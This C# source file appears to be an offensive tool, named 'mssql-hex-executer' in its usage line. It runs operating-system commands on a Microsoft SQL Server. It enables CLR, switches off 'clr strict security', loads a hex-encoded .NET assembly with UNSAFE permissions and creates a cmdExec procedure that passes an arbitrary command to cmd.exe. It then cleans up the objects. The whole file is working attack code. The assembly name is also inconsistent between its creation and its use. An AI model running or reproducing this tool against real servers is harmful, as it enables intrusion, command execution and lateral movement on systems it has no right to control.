using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {

        public void exec(string sqlServer, string database, String cmdcmd)
        {
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
            String command1 = "DROP PROCEDURE IF EXISTS cmdExec; DROP ASSEMBLY IF EXISTS myAssembly ";
            String command = "use msdb; EXEC sp_configure 'show advanced options',1 ; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE; CREATE ASSEMBLY my_assembly FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000005045000064860200212B28AF0000000000000000F00022200B023000000C00000004000000000000000000000020000000000080010000000020000000020000040000000000000006000000000000000060000000020000000000000300608500004000000000000040000000000000000010000000000000200000000000000000000010000000000000000000000000000000000000000040000088030000000000000000000000000000000000000000000000000000F8290000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002E74657874000000A40A000000200000000C000000020000000000000000000000000000200000602E72737263000000880300000040000000040000000E00000000000000000000000000004000004000000000000000000000000000000000000000000000000000000000000000000000000000000000480000000200050014210000E4080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600B500000001000011731000000A0A066F1100000A72010000706F1200000A066F1100000A7239000070028C12000001281300000A6F1400000A066F1100000A166F1500000A066F1100000A176F1600000A066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A0716066F1C00000A6F1D00000A6F1E00000A6F1F00000A281A00000A076F2000000A281A00000A6F2100000A066F2200000A066F2300000A2A1E02282400000A2A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000B8020000237E0000240300000404000023537472696E67730000000028070000580000002355530080070000100000002347554944000000900700005401000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000240000000F0000000100000001000000030000000000700201000000000006009A0123030600070223030600B800F1020F00430300000600E000870206007D01870206005E0187020600EE0187020600BA0187020600D301870206000D0187020600CC0004030600AA0004030600410187020600280139020600950380020A00F700D0020A00530252030E007803F1020A006E00D0020E00A702F1020600690280020A002C00D0020A009A0020000A00E703D0020A009200D0020600B80216000600C5021600000000000D000000000001000100010010006703000041000100010048200000000096004100620001000921000000008618EB02060002000000010062000900EB0201001100EB0206001900EB020A002900EB0210003100EB0210003900EB0210004100EB0210004900EB0210005100EB0210005900EB0210006100EB0215006900EB0210007100EB0210007900EB0210008900EB0206009900EB020600990099022100A9007C001000B1008E032600A90080031000A90025021500A900CC0315009900B3032C00B900EB023000A100EB023800C90089003F00D100A80344009900B9034A00E10049004F0081005D024F00A10066025300D100F2034400D1005300060099009C0306009900A40006008100EB02060020007B004D012E000B0068002E00130071002E001B0090002E00230099002E002B00AA002E003300AA002E003B00AA002E00430099002E004B00B0002E005300AA002E005B00AA002E006300C8002E006B00F2002E007300FF001A0004800000010000000000000000000000000001000000040000000000000000000000590038000000000004000000000000000000000059002000000000000400000000000000000000005900800200000000000000436F6E736F6C6541707032003C4D6F64756C653E0053797374656D2E494F0053797374656D2E446174610053716C4D65746144617461006D73636F726C696200636D64457865630052656164546F456E640053656E64526573756C7473456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C44625479706500436C6F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E6700436F6E736F6C65417070322E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730053746F72656450726F636564757265730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F72457869740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F7700000000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F007500740070007500740000000480ED8D61578A4586A67A5022011E2A00042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000001001000B436F6E736F6C6541707032000005010000000017010012436F7079726967687420C2A920203230323200002901002462303834623262382D353132652D343235382D623666342D32616431383337373263653700000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E3204010000000000000000009F50BF9F000000000200000074000000302A0000300C00000000000000000000000000001000000000000000000000000000000052534453C1AD0C3CA9DC7740B7EEBF836C4E9D5701000000433A5C55736572735C41646D696E6973747261746F725C536F757263655C5265706F735C436F6E736F6C65417070325C436F6E736F6C65417070325C6F626A5C7836345C52656C656173655C436F6E736F6C65417070322E70646200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000002C03000000000000000000002C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B0048C020000010053007400720069006E006700460069006C00650049006E0066006F0000006802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D006500000000000000000040000C000100460069006C0065004400650073006300720069007000740069006F006E000000000043006F006E0073006F006C00650041007000700032000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E003000000040001000010049006E007400650072006E0061006C004E0061006D006500000043006F006E0073006F006C00650041007000700032002E0064006C006C0000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200320000002A00010001004C006500670061006C00540072006100640065006D00610072006B00730000000000000000004800100001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000043006F006E0073006F006C00650041007000700032002E0064006C006C00000038000C000100500072006F0064007500630074004E0061006D0065000000000043006F006E0073006F006C00650041007000700032000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;";
            String nextcommand = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec]; ";
            String lastcommand = "EXEC cmdExec '"+ cmdcmd + "';";
            SqlCommand cmd = new SqlCommand(command, con);
            SqlCommand cmdpre = new SqlCommand(command1, con);
            con.Open();
            SqlDataReader reader2 = cmdpre.ExecuteReader();
            reader2.Close();
            SqlDataReader reader = cmd.ExecuteReader();
            reader.Close();

            //reader.Read();
            //Console.WriteLine("Response: " + reader[0]);
            //reader.Close();
            SqlCommand cmd1 = new SqlCommand(nextcommand, con);
            
            SqlDataReader reader1 = cmd1.ExecuteReader();
            //reader1.Read();
            //Console.WriteLine("Response: " + reader1[0]);
            reader1.Close();

            SqlCommand cmdlast = new SqlCommand(lastcommand, con);

            SqlDataReader reader3 = cmdlast.ExecuteReader();
            reader3.Read();
            Console.WriteLine("Response: " + reader3[0]);
            reader3.Close();
            SqlDataReader reader4 = cmdpre.ExecuteReader();
            reader4.Close();
            con.Close();
            con.Close();
        }

        static void Main(string[] args)
        {
           if (args.Length == 3)
            {
                String database = args[1];
                String sqlServer = args[0];
                String cmdcmd = args[2];
                Program pr = new Program();
                pr.exec(sqlServer, database, cmdcmd);
            }
           else {
                Console.WriteLine("Usage: mssql-hex-executer.exe sqlserver database \"cmd to execute\" ");
            }
           
        }

    }

}
